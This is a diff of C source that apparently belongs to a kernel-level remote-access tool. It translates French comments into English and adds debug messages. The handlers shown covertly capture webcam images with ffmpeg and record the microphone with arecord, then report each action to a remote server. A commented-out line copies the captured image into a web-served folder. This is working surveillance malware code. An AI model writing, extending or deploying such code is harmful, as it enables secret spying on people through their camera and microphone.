@@ -335,9 +335,9 @@ int list_dir_handler(char *args) {
     kfree(buf);
     return 0;
 }
-
-// Commande pour démarrer la webcam et capturer une image
+// Command to start the webcam and capture an image
 int start_webcam_handler(char *args) {
+    DBG_MSG("start_webcam_handler: starting webcam to capture an image\n");
     static char *argv[] = { "/usr/bin/ffmpeg", "-f", "v4l2", "-i", "/dev/video0", "-t", "00:00:10", "-s", "640x480", "-f", "image2", "/tmp/capture.jpg", NULL };
     static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
 
@@ -346,12 +346,14 @@ int start_webcam_handler(char *args) {
         ERR_MSG("start_webcam_handler: failed to start webcam\n");
         return ret_code;
     }
+    DBG_MSG("start_webcam_handler: webcam started successfully, image captured\n");
     send_to_server("Webcam activated and image captured\n");
     return SUCCESS;
 }
 
-// Commande pour capturer une image de la webcam
+// Command to capture an image from the webcam
 int capture_image_handler(char *args) {
+    DBG_MSG("capture_image_handler: capturing an image from the webcam\n");
     static char *argv[] = { "/usr/bin/ffmpeg", "-f", "v4l2", "-i", "/dev/video0", "-t", "00:00:10", "-s", "640x480", "-f", "image2", "/tmp/capture.jpg", NULL };
     static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
 
@@ -360,12 +362,12 @@ int capture_image_handler(char *args) {
         ERR_MSG("capture_image_handler: failed to capture image\n");
         return ret_code;
     }
-    // Envoyer l'image capturée au serveur
+    DBG_MSG("capture_image_handler: image captured successfully, saved at /tmp/capture.jpg\n");
     send_to_server("Captured image saved at /tmp/capture.jpg\n");
 
     /*
-    // Copiez l'image dans un répertoire accessible à Flask
-    // Par exemple, dans /var/www/html/images/ sur le serveur
+    // Copy the image to a directory accessible by Flask
+    // For example, to /var/www/html/images/ on the server
     int copy_ret_code = system("cp /tmp/capture.jpg /var/www/html/images/capture.jpg");
     if (copy_ret_code < 0) {
         ERR_MSG("capture_image_handler: failed to copy image to web accessible directory\n");
@@ -375,8 +377,9 @@ int capture_image_handler(char *args) {
     return SUCCESS;
 }
 
-// Commande pour démarrer l'enregistrement du microphone
+// Command to start recording from the microphone
 int start_microphone_handler(char *args) {
+    DBG_MSG("start_microphone_handler: starting microphone recording\n");
     static char *argv[] = { "/usr/bin/arecord", "-D", "plughw:1,0", "-f", "cd", "-t", "wav", "-d", "10", "/tmp/audio.wav", NULL };
     static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
 
@@ -385,12 +388,14 @@ int start_microphone_handler(char *args) {
         ERR_MSG("start_microphone_handler: failed to start microphone\n");
         return ret_code;
     }
+    DBG_MSG("start_microphone_handler: microphone recording started successfully, audio saved at /tmp/audio.wav\n");
     send_to_server("Microphone activated and audio recorded\n");
     return SUCCESS;
 }
 
-// Commande pour jouer un fichier audio
+// Command to play an audio file
 int play_audio_handler(char *args) {
+    DBG_MSG("play_audio_handler: playing audio file from /tmp/audio.wav\n");
     static char *argv[] = { "/usr/bin/aplay", "/tmp/audio.wav", NULL };
     static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
 
@@ -399,6 +404,7 @@ int play_audio_handler(char *args) {
         ERR_MSG("play_audio_handler: failed to play audio\n");
         return ret_code;
     }
+    DBG_MSG("play_audio_handler: audio played successfully\n");
     send_to_server("Audio played\n");
     return SUCCESS;
 }
